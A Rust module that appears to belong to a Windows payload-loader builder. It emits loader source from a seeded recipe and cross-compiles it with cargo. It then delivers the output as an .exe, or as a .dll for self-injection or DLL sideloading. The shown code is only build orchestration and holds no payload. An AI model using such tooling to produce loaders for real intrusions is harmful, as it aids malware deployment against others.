use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};
use std::process::{Command, ExitStatus, Stdio};

use crate::emit::{self, EmitError};
use crate::logbus::Sink;
use crate::spec::{LoaderKind, OutputForm, BuildSpec};

pub fn workdir_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("workdir")
}

pub fn clean_workdir() -> Result<u64, std::io::Error> {
    let root = workdir_root();
    if !root.exists() {
        return Ok(0);
    }
    let freed = dir_size(&root).unwrap_or(0);
    std::fs::remove_dir_all(&root)?;
    Ok(freed)
}

pub fn workdir_size() -> u64 {
    let root = workdir_root();
    if !root.exists() {
        return 0;
    }
    dir_size(&root).unwrap_or(0)
}

fn dir_size(path: &Path) -> Result<u64, std::io::Error> {
    let mut total: u64 = 0;
    for entry in std::fs::read_dir(path)? {
        let entry = entry?;
        let meta = entry.metadata()?;
        if meta.is_dir() {
            total = total.saturating_add(dir_size(&entry.path()).unwrap_or(0));
        } else {
            total = total.saturating_add(meta.len());
        }
    }
    Ok(total)
}

#[derive(Debug, thiserror::Error)]
pub enum ComposeError {
    #[error("emit: {0}")]
    Emit(#[from] EmitError),
    #[error("io: {0}")]
    Io(#[from] std::io::Error),
    #[error("cargo failed (exit {0:?})")]
    CargoFailed(ExitStatus),
    #[error("artifact not produced at {0}")]
    NoArtifact(PathBuf),
}

pub fn run(recipe: &BuildSpec, log: &Sink) -> Result<PathBuf, ComposeError> {
    log.write(&format!("[+] seed: {}", recipe.seed.hex()));
    log.write("[*] emit loader source");
    let prog = emit::build(recipe)?;

    let workdir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("workdir")
        .join(recipe.seed.hex());
    if workdir.exists() {
        std::fs::remove_dir_all(&workdir)?;
    }
    log.write(&format!("[+] workdir: {}", workdir.display()));
    emit::materialize(&prog, &workdir)?;

    log.write("[*] cargo build --release");
    let status = cargo_build(&workdir, log)?;
    if !status.success() {
        return Err(ComposeError::CargoFailed(status));
    }

    let target_triple = "x86_64-pc-windows-msvc";
    let crate_name = &prog.crate_meta.crate_name;
    let candidate = workdir
        .join("target")
        .join(target_triple)
        .join("release")
        .join(artifact_name(crate_name, &recipe.loader));
    if !candidate.exists() {
        return Err(ComposeError::NoArtifact(candidate));
    }

    std::fs::copy(&candidate, &recipe.delivery_path)?;
    log.write(&format!("[+] delivered to {}", recipe.delivery_path.display()));
    Ok(recipe.delivery_path.clone())
}

fn cargo_build(workdir: &std::path::Path, log: &Sink) -> Result<ExitStatus, std::io::Error> {
    let manifest = workdir.join("Cargo.toml");
    let mut cmd = Command::new("cargo");
    cmd.env("RUSTFLAGS", "-C target-feature=+crt-static")
        .args(["build", "--release", "--manifest-path"])
        .arg(&manifest)
        .args(["--target", "x86_64-pc-windows-msvc"]);
    cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = cmd.spawn()?;
    let so = child.stdout.take();
    let se = child.stderr.take();
    let l1 = log.clone();
    let t_out = so.map(|out| {
        std::thread::spawn(move || {
            for line in BufReader::new(out).lines().map_while(Result::ok) {
                l1.write(&line);
            }
        })
    });
    let l2 = log.clone();
    let t_err = se.map(|err| {
        std::thread::spawn(move || {
            for line in BufReader::new(err).lines().map_while(Result::ok) {
                l2.write(&line);
            }
        })
    });
    let status = child.wait()?;
    if let Some(t) = t_out {
        let _ = t.join();
    }
    if let Some(t) = t_err {
        let _ = t.join();
    }
    Ok(status)
}

fn artifact_name(crate_name: &str, loader: &LoaderKind) -> String {
    match loader {
        LoaderKind::SelfInject {
            format: OutputForm::Dll { .. } | OutputForm::DllSideload(_),
            ..
        } => format!("{crate_name}.dll"),
        _ => format!("{crate_name}.exe"),
    }
}
